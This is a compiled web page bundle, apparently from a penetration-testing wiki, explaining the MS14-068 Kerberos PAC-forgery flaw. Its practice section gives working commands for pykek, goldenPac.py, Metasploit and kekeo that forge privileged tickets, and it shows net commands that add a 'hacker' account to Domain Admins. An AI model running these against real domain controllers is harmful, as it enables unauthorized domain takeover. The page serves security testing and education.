import{_ as o,c as k,a5 as h,G as t,w as a,B as n,o as d,j as i,a as e}from"./chunks/framework.B5CpDqM0.js";const b=JSON.parse('{"title":"MS14-068","description":"CVE-2014-6324","frontmatter":{"description":"CVE-2014-6324","authors":"ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/kerberos/forged-tickets/ms14-068.md","filePath":"ad/movement/kerberos/forged-tickets/ms14-068.md","lastUpdated":1724982529000}'),p={name:"ad/movement/kerberos/forged-tickets/ms14-068.md"};function c(g,s,u,y,E,m){const l=n("PluginTabsTab"),r=n("PluginTabs");return d(),k("div",null,[s[2]||(s[2]=h('<h1 id="ms14-068" tabindex="-1">MS14-068 <a class="header-anchor" href="#ms14-068" aria-label="Permalink to &quot;MS14-068&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>This vulnerability allows attackers to forge a TGT with high privileges (i.e. with a modified PAC stating the user is a member of privileged groups). This attack is similar to the <a href="./golden">Golden ticket</a>, however, it doesn&#39;t require the attacker to know the <code>krbtgt</code>. This attack is a really powerful privilege escalation technique, however, it relies on a 2014 bug and will not work on patched domain controllers.</p><p>This vulnerability is possible due to a misvalidation of the PAC signature, allowing to craft a PAC granting powerful rights to a user while still being legitimate in the eyes of the KDC(Key Distribution Center). Contrary to what Microsoft doc states <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/6e95edd3-af93-41d4-8303-6c7955297315?redirectedfrom=MSDN" target="_blank" rel="noreferrer">here</a>, there are more than three <code>SignatureTypes</code> accepted by the KDC : before MS14-068 patch, a signature was considered valid by <code>KdcVerifyPacSignature</code> if its size was &lt;= 20 bytes. Therefore, it was possible to sign a PAC with a non-keyed hashing algorithm such as MD5 and have this PAC be considered valid.</p><div class="tip custom-block"><p>A non-keyed algorithm is a type of encryption that does not use a key to encrypt or decrypt the data. It uses instead a fixed algorithm, which makes it much less secure than a keyed algorithm. Non-keyed algorithms are usually easier to crack or break because they do not have the added security of a key to protect the data.</p></div><p>The exploitation goes as follow:</p><ol><li>A PAC-less TGT is obtained via an AS-REQ with the <code>PA-PAC-REQUEST</code> attribute set to false. This will be used in a later step.</li><li>A PAC indicating an account membership to powerful groups in the domain is forged and &quot;signed&quot; with MD5 (or any other non-keyed algorithm listed <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/c6dabc82-0792-4475-a44e-ae9b640d2613" target="_blank" rel="noreferrer">here</a>).</li><li>A TGS-REQ message, requesting a service ticket targeting the KRBTGT service (i.e. a TGT-like) is sent to the vulnerable KDC, using the forged PAC from step (2) encrypted with a sub-session key (usually the session key) and included in the TGT from step (1).</li><li>In response to step (3), a new TGT containing the forged PAC will be received from the vulnerable KDC after its validation of the forged PAC (the vulnerability happens here).</li></ol><p>The newly obtained TGT can be use like a <a href="./golden">golden ticket</a>, with <a href="./../ptt">pass-the-ticket</a>, to perform privileged various actions.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2>',9)),t(r,null,{default:a(()=>[t(l,{label:"UNIX-like"},{default:a(()=>s[0]||(s[0]=[i("div",{class:"tip custom-block"},[i("p",null,[e("Referring to "),i("a",{href:"https://github.com/gentilkiwi/kekeo/wiki/ms14068",target:"_blank",rel:"noreferrer"},"kekeo"),e("'s wiki might help untangle some situations but errors like "),i("code",null,"KDC_ERR_SUMTYPE_NOSUPP (15)"),e(" or "),i("code",null,"KRB_ERR_GENERIC (60)"),e(" when trying to use the generated "),i("code",null,".ccache"),e(" ticket should mean the target is patched.")])],-1),i("p",null,[i("strong",null,"PyKEK")],-1),i("p",null,[e("This attack can be operated with "),i("a",{href:"https://github.com/mubix/pykek",target:"_blank",rel:"noreferrer"},"pykek"),e("'s "),i("a",{href:"https://github.com/mubix/pykek/blob/master/ms14-068.py",target:"_blank",rel:"noreferrer"},"ms14-068"),e(" Python script. The script can carry out the attack with a cleartext password or with "),i("a",{href:"./../../ntlm/pth"},"pass-the-hash"),e(".")],-1),i("p",null,"In order to operate the attack, knowing a domain account’s name, its password (or hash) and its SID are needed.",-1),i("p",null,"A TGT can then be obtained with one of the following commands.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with a plaintext password")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ms14-068.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$BASICUSER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"@"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN_FQDN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -s"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$BASICUSER_SID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# with pass-the-hash")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ms14-068.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$BASICUSER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"@"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN_FQDN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --rc4"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$NT_HASH"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -s"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$BASICUSER_SID"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("p",null,[e("Once the "),i("code",null,".ccache"),e(" TGT is obtained, if the attack is successful, the ticket will be usable with "),i("a",{href:"./../ptt"},"pass-the-ticket"),e(". An easy way to check if the TGT works is to use it and ask for a service ticket. This can be done with Impacket's "),i("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py",target:"_blank",rel:"noreferrer"},"getST.py"),e(" (Python).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"getST.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -k"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -no-pass"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -spn"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'any_valid_spn'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("p",null,[e('This step will only make sure the TGT works though. It will not indicate for sure that the attack worked. This is because a patched DC could ignore the forged PAC and include a legitimate PAC instead. But the TGT would still be valid. It would simply be "unprivileged". Trying to use the service ticket for a privileged taks, '),i("a",{href:"./../../credentials/dumping/dcsync"},"DCSync"),e(" for instance, is advised.")],-1),i("div",{class:"tip custom-block"},[i("p",null,[e("Another way of knowing, for sure, if the target DC is patched or not is to decrypt the ticket obtained with "),i("a",{href:"https://github.com/fortra/impacket/pull/1201",target:"_blank",rel:"noreferrer"},"describeTicket.py"),e(" and make sure the PAC features the privileged groups (512, 518, 519, 520). If the privileged groups are missing, it means the DC is patched and the forged PAC was ignored and replaced with a legitimate one. Knowing the krbtgt key is needed, so this would best fit a whitebox audit scenario (or successful pentest).")])],-1),i("div",{class:"note custom-block"},[i("p",null,[e("In some scenarios, I personally have had trouble using the "),i("code",null,".ccache"),e(" ticket on UNIX-like systems. What I did was "),i("a",{href:"./../ptt#practice"},"convert it"),e(" to "),i("code",null,".kirbi"),e(", switch to a Windows system, inject the ticket with mimikatz's using"),i("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/kerberos/ptt",target:"_blank",rel:"noreferrer"},[i("code",null,"kerberos:ptt")]),e(" command, and then create a new user and add it to the domain admins group.")]),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "hacker"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "132Pentest!!!"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /add")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," group"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "Domain Admins"'),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /domain"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /add")])])])])],-1),i("hr",null,null,-1),i("p",null,[i("strong",null,"Impacket (goldenPac.py)")],-1),i("p",null,[e("The attack can also be carried out automatically using Impacket's "),i("a",{href:"https://github.com/fortra/impacket/blob/master/examples/goldenPac.py",target:"_blank",rel:"noreferrer"},"goldenPac.py"),e(" (Python). This tool conducts the attack and tries to open a privileged session using the obtained TGT and PsExec. The TGT can be stored locally with the "),i("code",null,"-w path"),e(" parameter.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"goldenPac.py"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN_FQDN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"@"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("hr",null,null,-1),i("p",null,[i("strong",null,"Metasploit Framework")],-1),i("p",null,"The Metasploit Framework can also be useful in the sense that it prints valuable error information.",-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"msf6"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," >"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," use"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," admin/kerberos/ms14_068_kerberos_checksum")])])])],-1)])),_:1}),t(l,{label:"Windows"},{default:a(()=>s[1]||(s[1]=[i("p",null,[i("strong",null,"Kekeo")],-1),i("p",null,[e("Prerequisite : Build ms14068.exe following "),i("a",{href:"https://github.com/gentilkiwi/kekeo#readme",target:"_blank",rel:"noreferrer"},"kekeo's documentation"),e(".")],-1),i("div",{class:"language-batch vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"batch"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"# NB : ms14068.exe can act in two ways")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"# /ticket : Write the obtained ticket on disk with default name tgt.kirbi")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"# /ptt : Pass-the-ticket by directly injecting the obtained TGT into LSA")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"# with password")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"# domain SID and user RID are automaticaly discovered")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ms14068.exe /domain:$domain /user:$user /password:$password /kdc:$VULN_KDC_FQDN")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"# with an NT hash")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"# AES-128 and AES-256 keys are also usable with /aes128 and /aes256 respectively")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"# note that automatic discovery of the user SID is "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"not"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," possible when using hash ")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ms14068.exe /domain:$domain /user:$user /key:$krbtgt_NThash /sid:$DomainSID /rid:$userRelativeID /kdc:$KDC_FQDN")])])])],-1)])),_:1})]),_:1}),s[3]||(s[3]=h('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://labs.withsecure.com/publications/digging-into-ms14-068-exploitation-and-defence" target="_blank" rel="noreferrer">https://labs.withsecure.com/publications/digging-into-ms14-068-exploitation-and-defence</a></p><p><a href="https://ruuand.github.io/MS14-068/" target="_blank" rel="noreferrer">https://ruuand.github.io/MS14-068/</a></p><p><a href="https://adsecurity.org/?p=525" target="_blank" rel="noreferrer">https://adsecurity.org/?p=525</a></p><p><a href="https://adsecurity.org/?p=541" target="_blank" rel="noreferrer">https://adsecurity.org/?p=541</a></p><p><a href="https://www.beyondtrust.com/blog/entry/a-quick-look-at-ms14-068" target="_blank" rel="noreferrer">https://www.beyondtrust.com/blog/entry/a-quick-look-at-ms14-068</a></p><p><a href="https://github.com/gentilkiwi/kekeo/wiki/ms14068" target="_blank" rel="noreferrer">https://github.com/gentilkiwi/kekeo/wiki/ms14068</a></p>',7))])}const C=o(p,[["render",c]]);export{b as __pageData,C as default};